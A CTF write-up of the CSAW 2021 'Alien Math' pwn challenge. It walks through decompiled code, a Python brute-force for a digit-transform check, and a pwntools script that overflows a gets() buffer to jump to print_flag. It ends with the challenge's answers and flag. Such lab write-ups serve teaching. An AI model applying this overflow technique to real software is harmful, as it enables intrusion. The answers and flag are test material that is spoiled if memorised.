+++
title = "CSAW CTF Qualification Round 2021 - Alien Math"
date = 2021-09-14
[taxonomies]
categories = ["ctfs"]
tags = ["csawctf2021", "pwn"]
+++

# Alien Math

## Task description

Brush off your Flirbgarple textbooks!

[alien_math](/files/csawctf2021/alien_math)

## Solution

The application asks 3 questions and while the first two are implemented correctly the 3rd uses `gets`. So, we have to correctly answer to the first two questions and then just do a simple buffer overflow. In addition, there's a function called print_flag which prints the flag.

```c
undefined8 main(void)
{
  int iVar1;
  undefined local_38 [36];
  int local_14;
  long local_10;

  puts("\n==== Flirbgarple Math Pop Quiz ====");
  puts("=== Make an A to receive a flag! ===\n");
  puts("What is the square root of zopnol?");
  fflush(stdout);
  __isoc99_scanf(&DAT_0040220b,&local_14);
  iVar1 = rand();
  local_10 = (long)iVar1;
  if (local_10 == (long)local_14) {
    puts("Correct!\n");
    fflush(stdout);
    getchar();
    puts("How many tewgrunbs are in a qorbnorbf?");
    fflush(stdout);
    __isoc99_scanf(&DAT_00402247,local_38);
    second_question(local_38);
  }
  else {
    puts("Incorrect. That\'s an F for you!");
  }
  return 0;
}
```

The first question does `rand()` without setting the seed and the default seed value is 0 (not always, it depends on the implementation). So it's a constant.

```c
void second_question(char *param_1)
{
  char cVar1;
  int iVar2;
  size_t __n;
  ulong uVar3;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  int local_1c;

  local_1c = 0;
  while( true ) {
    uVar3 = SEXT48(local_1c);
    __n = strlen(param_1);
    if (__n - 1 <= uVar3) {
      local_38 = 3762247539570849591;
      local_30 = 3689067348388623672;
      local_28 = 58489707246130;
      __n = strlen((char *)&local_38);
      iVar2 = strncmp((char *)&local_38,param_1,__n);
      if (iVar2 == 0) {
        puts("Genius! One question left...\n");
        final_question();
        puts("Not quite. Double check your calculations.\nYou made a B. So close!\n");
      }
      else {
        puts("You get a C. No flag this time.\n");
      }
      return;
    }
    if ((param_1[local_1c] < '0') || ('9' < param_1[local_1c])) break;
    cVar1 = param_1[(long)local_1c + 1];
    iVar2 = second_question_function
                      ((ulong)(uint)(int)param_1[local_1c],
                       (ulong)(uint)(param_1[local_1c] + local_1c),
                       (ulong)(uint)(param_1[local_1c] + local_1c));
    iVar2 = (int)cVar1 + -0x30 + iVar2;
    param_1[(long)local_1c + 1] = (char)iVar2 + (char)(iVar2 / 10) * -10 + '0';
    local_1c = local_1c + 1;
  }
  puts("Xolplsmorp! Invalid input!\n");
  puts("You get a C. No flag this time.\n");
  return;
}

ulong second_question_function(int param_1,int param_2)
{
  return (ulong)((uint)((param_1 + -0x30) * 0x30 + (param_2 + -0x30) * 0xb + -4) % 10);
}
```

The second question takes a line, does some operations on it and compares with the hardcoded value. The decompiled code is a bit of a bad quality but it could be summarized to this pseudocode:

```py3
input_str = "12345" # only numbers are allowed
for i in range(len(input_str) - 1):
    input_str[i + 1] = do_something(input_str[i], input_str[i + 1])

if input_str == "7759406485255323229225":
    final_question()
```

Which means that we can bruteforce it easily. A thing to note is that the first letter has to be 7 because it can't be modified (modifications start from index 1).

```py3
from string import digits


def second_func(a, b):
    return ((a - 0x30) * 0x30 + (b - 0x30) * 0xB - 4) % 10


def encrypt(input_str):
    input_str = [ord(c) for c in input_str]

    for i in range(len(input_str) - 1):
        c1 = input_str[i + 1]
        c2 = second_func(input_str[i], input_str[i] + i)

        c3 = c1 - 0x30 + c2

        input_str[i + 1] = c3 - (c3 // 10) * 10 + ord("0")

    input_str = [chr(i) for i in input_str]

    return "".join(input_str)


solutions = ["7"]
encrypted = "7759406485255323229225"

for i in range(len(encrypted) - 1):
    new_solutions = []
    for p in solutions:
        for s in digits:
            o = encrypt(p + s)
            if encrypted.startswith(o):
                new_solutions.append(p + s)

    solutions = new_solutions

print(solutions)
```

```c
void final_question(void)
{
  undefined8 local_18;
  undefined8 local_10;

  local_18 = 0;
  local_10 = 0;
  puts(
      "How long does it take for a toblob of energy to be transferred between two quantum entangledsalwzoblrs?"
      );
  fflush(stdout);
  getchar();
  gets((char *)&local_18);
  return;
}
```

The final exploit.

```py3
from pwn import *

# io = process("./alien_math")
io = remote("pwn.chal.csaw.io", 5004)

io.sendline("1804289383".encode())  # first question

io.sendline("7856445899213065428791".encode())  # second question

payload = b"A" * cyclic_find(0x61616167)
payload += p64(0x004014FB)  # print_flag function address
io.sendline(payload)

io.interactive()
```

The flag: `flag{w3fL15n1Rx!_y0u_r34lLy_4R3_@_fL1rBg@rpL3_m4573R!}`
